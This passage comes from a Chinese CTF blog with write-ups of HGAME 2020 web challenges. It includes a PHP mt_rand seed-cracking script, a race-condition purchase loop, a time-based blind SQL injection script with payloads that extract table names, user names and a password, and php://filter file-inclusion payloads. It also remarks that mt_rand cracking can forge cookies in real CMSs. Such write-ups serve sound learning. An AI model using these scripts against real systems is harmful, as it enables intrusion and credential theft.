class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_undo_php_mt_initialize</span><span class="params">(s, i)</span>:</span></span><br><span class="line">    s = (STATE_MULT_INV * (s - i)) &amp; MAX</span><br><span class="line">    <span class="keyword">return</span> s ^ s &gt;&gt; <span class="number">30</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">php_mt_rand</span><span class="params">(s1)</span>:</span></span><br><span class="line">    <span class="string">"""Converts a merged state value `s1` into a random value, then sent to the</span></span><br><span class="line"><span class="string">    user.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    s1 ^= (s1 &gt;&gt; <span class="number">11</span>)</span><br><span class="line">    s1 ^= (s1 &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span></span><br><span class="line">    s1 ^= (s1 &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span></span><br><span class="line">    s1 ^= (s1 &gt;&gt; <span class="number">18</span>)</span><br><span class="line">    <span class="keyword">return</span> s1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_php_mt_rand</span><span class="params">(s1)</span>:</span></span><br><span class="line">    <span class="string">"""Retrieves the merged state value from the value sent to the user.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    s1 ^= (s1 &gt;&gt; <span class="number">18</span>)</span><br><span class="line">    s1 ^= (s1 &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span></span><br><span class="line"></span><br><span class="line">    s1 = undo_lshift_xor_mask(s1, <span class="number">7</span>, <span class="number">0x9d2c5680</span>)</span><br><span class="line"></span><br><span class="line">    s1 ^= s1 &gt;&gt; <span class="number">11</span></span><br><span class="line">    s1 ^= s1 &gt;&gt; <span class="number">22</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_lshift_xor_mask</span><span class="params">(v, shift, mask)</span>:</span></span><br><span class="line">    <span class="string">"""r s.t. v = r ^ ((r &lt;&lt; shift) &amp; mask)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(shift, <span class="number">32</span>, shift):</span><br><span class="line">        v ^= (bits(v, i - shift, shift) &amp; bits(mask, i, shift)) &lt;&lt; i</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bits</span><span class="params">(v, start, size)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> lobits(v &gt;&gt; start, size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lobits</span><span class="params">(v, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> v &amp; ((<span class="number">1</span> &lt;&lt; b) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bit</span><span class="params">(v, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> v &amp; (<span class="number">1</span> &lt;&lt; b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bv</span><span class="params">(v, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> bit(v, b) &gt;&gt; b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">php_mt_reload</span><span class="params">(state, flavour)</span>:</span></span><br><span class="line">    s = state</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, N - M):</span><br><span class="line">        s[i] = _twist_php(s[i + M], s[i], s[i + <span class="number">1</span>], flavour)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(N - M, N - <span class="number">1</span>):</span><br><span class="line">        s[i] = _twist_php(s[i + M - N], s[i], s[i + <span class="number">1</span>], flavour)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_twist_php</span><span class="params">(m, u, v, flavour)</span>:</span></span><br><span class="line">    <span class="string">"""Emulates the `twist` and `twist_php` #defines.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    mask = <span class="number">0x9908b0df</span> <span class="keyword">if</span> (u <span class="keyword">if</span> flavour == MT_RAND_PHP <span class="keyword">else</span> v) &amp; <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> m ^ (((u &amp; <span class="number">0x80000000</span>) | (v &amp; <span class="number">0x7FFFFFFF</span>)) &gt;&gt; <span class="number">1</span>) ^ mask</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_php_mt_reload</span><span class="params">(S000, S227, offset, flavour)</span>:</span></span><br><span class="line">    <span class="comment"># define twist_php(m,u,v)  (m ^ (mixBits(u,v)&gt;&gt;1) ^ ((uint32_t)(-(int32_t)(loBit(u))) &amp; 0x9908b0dfU))</span></span><br><span class="line">    <span class="comment"># m S000</span></span><br><span class="line">    <span class="comment"># u S227</span></span><br><span class="line">    <span class="comment"># v S228</span></span><br><span class="line">    X = S000 ^ S227</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This means the mask was applied, and as such that S227's LSB is 1</span></span><br><span class="line">    s22X_0 = bv(X, <span class="number">31</span>)</span><br><span class="line">    <span class="comment"># remove mask if present</span></span><br><span class="line">    <span class="keyword">if</span> s22X_0:</span><br><span class="line">        X ^= <span class="number">0x9908b0df</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Another easy guess</span></span><br><span class="line">    s227_31 = bv(X, <span class="number">30</span>)</span><br><span class="line">    <span class="comment"># remove bit if present</span></span><br><span class="line">    <span class="keyword">if</span> s227_31:</span><br><span class="line">        X ^= <span class="number">1</span> &lt;&lt; <span class="number">30</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># We're missing bit 0 and bit 31 here, so we have to try every possibility</span></span><br><span class="line">    s228_1_30 = (X &lt;&lt; <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> s228_0 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> s228_31 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">if</span> flavour == MT_RAND_MT19937 <span class="keyword">and</span> s22X_0 != s228_0:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            s228 = s228_0 | s228_31 &lt;&lt; <span class="number">31</span> | s228_1_30</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Check if the results are consistent with the known bits of s227</span></span><br><span class="line">            s227 = _undo_php_mt_initialize(s228, <span class="number">228</span> + offset)</span><br><span class="line">            <span class="keyword">if</span> flavour == MT_RAND_PHP <span class="keyword">and</span> bv(s227, <span class="number">0</span>) != s22X_0:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> bv(s227, <span class="number">31</span>) != s227_31:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># Check if the guessed seed yields S000 as its first scrambled state</span></span><br><span class="line">            rand = undo_php_mt_initialize(s228, <span class="number">228</span> + offset)</span><br><span class="line">            state = php_mt_initialize(rand)</span><br><span class="line">            php_mt_reload(state, flavour)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (S000 == state[offset]):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> rand</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(_R000, _R227, offset, flavour)</span>:</span></span><br><span class="line">    <span class="comment"># Both were &gt;&gt; 1, so the leftmost byte is unknown</span></span><br><span class="line">    _R000 &lt;&lt;= <span class="number">1</span></span><br><span class="line">    _R227 &lt;&lt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> R000_0 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> R227_0 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            R000 = _R000 | R000_0</span><br><span class="line">            R227 = _R227 | R227_0</span><br><span class="line">            S000 = undo_php_mt_rand(R000)</span><br><span class="line">            S227 = undo_php_mt_rand(R227)</span><br><span class="line">            seed = undo_php_mt_reload(S000, S227, offset, flavour)</span><br><span class="line">            <span class="keyword">if</span> seed:</span><br><span class="line">                <span class="keyword">return</span> seed</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">seed=main(int(arg1), int(arg2), <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">print(seed)</span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">'ans'</span>:seed</span><br><span class="line">&#125;</span><br><span class="line">res1=s.post(url1,data)</span><br><span class="line">print(res1.text)</span><br><span class="line">time_end=time.time()</span><br><span class="line">print(<span class="string">'totally cost'</span>,time_end-time_start)</span><br></pre></td></tr></table></figure><p>为了方便我加了个计时器输出运行时间，可是貌似时间约0.3s左右时也没拿到flag。好在自己没放弃一直试，后面脚本运行时间差不多一直为0.18s左右时拿到flag了。可能一开始自己内存跑太满了吧……<br><img src="/2020/02/02/%E6%9D%AD%E7%94%B5hgame-week3/3.PNG" alt="flag"></p><p>ps:我错了。后来才发现这个洞很有用处。因为很多cms的cookie是直接<code>mt_rand()</code>生成的。所以伪造cookie是一种妙招</p><h1 id="Cosmos的二手市场"><a href="#Cosmos的二手市场" class="headerlink" title="Cosmos的二手市场"></a>Cosmos的二手市场</h1><p> 有些丢脸。能做出来是靠师傅的提示。之前最大的问题主要在于没有辨析出漏洞所在，因此不好下手。像这类买卖东西的题目，我自己的认识主要来源于hackergame2019的达拉崩吧大冒险。当时里面漏洞之处在于自己的战斗力可以为负数，所以引申出负溢出。而这道题开始我也当成负溢出了，实际上是个多线程，或许叫条件竞争更为准确。</p><p>用burp重复发包卖东西，同时自己用python脚本不断买东西。只要burp的线程数快于python的，就可以保证金钱数在增加。<br>pyhton脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">'http://121.36.88.65:9999//API/?method=buy'</span></span><br><span class="line">cookies=&#123;<span class="string">'PHPSESSID'</span>:<span class="string">'d0ov3vsd1hpjjf8ofuakhacd0n'</span>&#125;</span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0'</span></span><br><span class="line">&#125;</span><br><span class="line">payload=&#123;</span><br><span class="line">    <span class="string">'code'</span>: <span class="string">'800002'</span>,</span><br><span class="line">    <span class="string">'amount'</span>: <span class="string">'30'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000000</span>):</span><br><span class="line">    res=requests.post(url,data=payload,cookies=cookies,headers=headers)</span><br><span class="line">    time.sleep(<span class="number">0.6</span>)</span><br></pre></td></tr></table></figure><p>比较菜，多线程忘光了，所以直接每次for循环用后<code>sleep()</code>一下。<br>burp直接重复发包：<br><img src="/2020/02/02/%E6%9D%AD%E7%94%B5hgame-week3/4.PNG" alt="payload调成NullPayloads"><br>最后多跑几遍，钱数够了后拿到flag<br><img src="/2020/02/02/%E6%9D%AD%E7%94%B5hgame-week3/5.PNG" alt="flag"></p><h1 id="Cosmos的留言板-2"><a href="#Cosmos的留言板-2" class="headerlink" title="Cosmos的留言板-2"></a>Cosmos的留言板-2</h1><p>有点坑。题目坑不在难度上，主要是环境太差了，估计几个人一起注就要出问题。好在联系出题人重启了两遍总算能做了，毕竟都是用的学生机，能理解的。</p><p>首先是找漏洞。题目名称明显是week2留言板的后续，也就是说多半是sql注入。开始进去一个登录框，提供了注册功能。所以先注册一个账号登进去。期间容易发现对用户名的过滤很严格；进去后发现一个留言板。通常留言板多半是xss或者sql注入了吧。于是尝试留几个言。发现都不行。这时注意到一个删除功能，点击删除功能时出现的url是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?method&#x3D;delete&amp;delete_id&#x3D;1101</span><br></pre></td></tr></table></figure><p>开始我的第一想法是这样的：(参考网上搜到的文章：<a href="https://juejin.im/entry/5c11e35b51882530e46188ed" target="_blank" rel="noopener">https://juejin.im/entry/5c11e35b51882530e46188ed</a><br>）<br>这道题目难度显然要高不少，但给我很大启发。其注入点在于删除操作中的语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result &#x3D; $conn-&gt;query(&quot;delete from note where id&#x3D;$id and user&#x3D;&#39;$user&#39;&quot;);</span><br></pre></td></tr></table></figure><p>其中<code>$user</code>是可注的。所以那道题目在执行删除操作时就可以触发已经注入的名字，引起二次注入。这也是我开始对留言板这题的判断：二次注入。但是尝试注册时发现过滤的实在是太多了，基本不可能注册一个sql语句，看来是在其他地方可注。<br>之后又重新注意到上面提到的删除语句，发现一件事，当我在burp里不改变<code>delete_id</code>重复发包时，结果都显示的删除成功。也就是说，这个操作并没有真正删掉我们的语句。仔细FUZZ的话，发现只要id传数字，任何数字都不会报错。判断是数值型注入。<br>但是回显就很难受了，尝试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete_id&#x3D;1 and 1&#x3D;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete_id&#x3D;1 and 1&#x3D;2</span><br></pre></td></tr></table></figure><p>的回显都是删除成功。这就不太妙了。而且经过FUZZ后并没有过滤掉关键字。只能尝试盲注，而且是时间盲注。<br>这里吐槽下题目，自己做时题目的id已经五千多，删除操作每次都贼卡。我用脚本测试时间盲注最简单的语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete_id&#x3D;if(length(database())&lt;100,sleep(5),1)</span><br></pre></td></tr></table></figure><p>都没有延迟，一度让我怀疑这个参数是否可注了。然而同样的payload第二天早上跑(估计因为做题的人这时候并不多)就测出有延时。难受，浪费了我好长时间自我怀疑。<br>所以贴下脚本吧，题目对关键字并没有过滤，唯一的问题就是环境不好，每次跑都跑不出完整结果。只有最后一次叫出题人重启环境时才成功跑出每一个字符。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">cookies=&#123;</span><br><span class="line">    <span class="string">'PHPSESSID'</span>:<span class="string">'f9nl4jl987d07pisnq508o1kg7'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        url = <span class="string">"http://139.199.182.61:19999/index.php?method=delete&amp;delete_id=if(ascii(substr((select group_concat(password) from user),"</span>+str(i)+<span class="string">",1))="</span>+str(j)+<span class="string">",sleep(10),1)"</span></span><br><span class="line">        <span class="comment">#if(length(database())="+str(i)+",sleep(6),1)"  7</span></span><br><span class="line">        <span class="comment">#if(ascii(substr(database(),1,1))="+str(i)+",sleep(6),1)    babysql</span></span><br><span class="line">        <span class="comment">#if(ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),"+str(i)+",1))="+str(j)+",sleep(6),1)    messages , user</span></span><br><span class="line">        <span class="comment">#if(ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='messages'),"+str(i)+",1))="+str(j)+",sleep(6),1)    message-id ,user-id,message</span></span><br><span class="line">        <span class="comment">#if(ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='user'),"+str(i)+",1))="+str(j)+",sleep(6),1)          id, name,password</span></span><br><span class="line">        <span class="comment">#if(ascii(substr((select group_concat(name) from user),"+str(i)+",1))="+str(j)+",sleep(6),1)   cosmos,</span></span><br><span class="line">        <span class="comment"># if(ascii(substr((select group_concat(password) from user),"+str(i)+",1))="+str(j)+",sleep(6),1)  f1FXOCnj26Fkadzt4Sqynf6O7CgR</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = requests.get(url, cookies=cookies, timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            flag+=chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>开始都是<code>sleep(6)</code>也能注,后来不得不调整到<code>sleep(10)</code>才好转了。总之题目是比较基本的时间盲注，但我估计很多人因为环境本来可以做的最后都不得不放弃。最后是注出user表里的cosmos跟密码，登录即可。<br><img src="/2020/02/02/%E6%9D%AD%E7%94%B5hgame-week3/6.PNG" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>杭电hgame-week2</title>
      <link href="2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/"/>
      <url>2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/</url>
      
        <content type="html"><![CDATA[<p>   第二周的题目明显难度提升了些许，不过稍微花点时间还是能做的。因为时间原因只做了web，但是能ak掉web已经算不错了hhh。希望在后面两个week还能继续如此吧。其中因为第四道题花了很长时间才做出来，干脆总结下做题经验顺便当学习笔记写写。</p><a id="more"></a><h1 id="Cosmos的博客后台"><a href="#Cosmos的博客后台" class="headerlink" title="Cosmos的博客后台"></a>Cosmos的博客后台</h1><p>个人觉得这道题出的挺不错的。至少把我之前淡忘的几个知识点都整合到一起。也顺便提醒了我接下来的学习笔记要写啥hhh。</p><p>首先进去一个登陆框。第一反应当然是sql注入。但是回显很有意思。</p><p><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/1.jpg" alt="回显"></p><p>这个“用户名或密码错误”回显直接否定了我们任何关于sql注入的可能。加上没什么隐藏信息，导致我当时这题就先放着去做第二道了。之后回过头看时，才想起来要抓个包。于是发现存在一个跳转<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/2.jpg" alt="action"></p><p>看到action就立马有了新思路。因为这正是文件包含漏洞利用的必备参数。那么就试试读文件吧。果断尝试伪协议。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure><p>这里自己被自己之前写的文章坑到了……原来一时兴起写了个“伪协议总能给你惊喜”，结果文章里注重<code>php://input</code>，但没有发现<code>php://filter</code>读文件的payload写错了…..自己有点淡忘就拿文章里的payload复制粘贴，结果半天不出结果。后来才发现自己写错了。<br>总之读到源码,base64解码后：<br>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: admin.php"</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$action = @$_GET[<span class="string">'action'</span>];</span><br><span class="line">$filter = <span class="string">"/config|etc|flag/i"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_GET[<span class="string">'action'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match($filter, $_GET[<span class="string">'action'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hacker get out!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">include</span> $action;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]) || <span class="keyword">empty</span>($_GET[<span class="string">'action'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: ?action=login.php"</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现admin.php的存在，以及login.php可能存在猫腻。 那也用伪协议读下<br>login.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="comment">//Only for debug</span></span><br><span class="line"><span class="keyword">if</span> (DEBUG_MODE)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>])) &#123;</span><br><span class="line">        $debug = $_GET[<span class="string">'debug'</span>];</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">"/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/"</span>, $debug)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"args error!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"var_dump($$debug);"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: admin.php"</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($admin_password == md5($_POST[<span class="string">'password'</span>]) &amp;&amp; $_POST[<span class="string">'username'</span>] === $admin_username)&#123;</span><br><span class="line">            $_SESSION[<span class="string">'username'</span>] = $_POST[<span class="string">'username'</span>];</span><br><span class="line">            header(<span class="string">"Location: admin.php"</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"用户名或密码错误"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#html部分略</span></span><br></pre></td></tr></table></figure><p>admin.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>])) &#123;</span><br><span class="line">    header(<span class="string">'Location: index.php'</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert_img</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'img_url'</span>])) &#123;</span><br><span class="line">        $img_url = @$_POST[<span class="string">'img_url'</span>];</span><br><span class="line">        $url_array = parse_url($img_url);</span><br><span class="line">        <span class="keyword">if</span> (@$url_array[<span class="string">'host'</span>] !== <span class="string">"localhost"</span> &amp;&amp; $url_array[<span class="string">'host'</span>] !== <span class="string">"timgsa.baidu.com"</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;   </span><br><span class="line">        $c = curl_init();</span><br><span class="line">        curl_setopt($c, CURLOPT_URL, $img_url);</span><br><span class="line">        curl_setopt($c, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $res = curl_exec($c);</span><br><span class="line">        curl_close($c);</span><br><span class="line">        $avatar = base64_encode($res);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(filter_var($img_url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $avatar;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> base64_encode(file_get_contents(<span class="string">"static/logo.png"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;Cosmos<span class="string">'Blog - 后台管理&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;a href="logout.php"&gt;退出登陆&lt;/a&gt;</span></span><br><span class="line"><span class="string">        